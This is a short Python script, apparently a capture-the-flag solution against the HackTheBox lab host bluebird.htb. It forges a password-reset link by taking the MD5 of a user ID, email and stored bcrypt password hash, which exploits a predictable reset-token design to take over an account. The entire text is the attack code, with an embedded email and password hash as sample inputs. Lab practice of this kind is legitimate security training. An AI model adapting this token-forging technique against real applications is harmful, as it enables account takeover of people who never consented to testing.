import hashlib

# Define user parameters
user_id = 10  # Example user ID
user_email = 'james@usa.gov'  # Example email
user_password = '$2a$12$SfnPDhoKhrNZFccB4KKiRedmva4or7mFNct0ePqqQHewg2YYqr68a'  # Example password

# Generate the MD5 hash
hash_input = f"{user_id}:{user_email}:{user_password}"
password_reset_hash = hashlib.md5(hash_input.encode()).hexdigest()

# Generate the password reset link
password_reset_link = f"https://bluebird.htb/reset?uid={user_id}&code={password_reset_hash}"

# Print the password reset link
print("Password Reset Link:", password_reset_link)
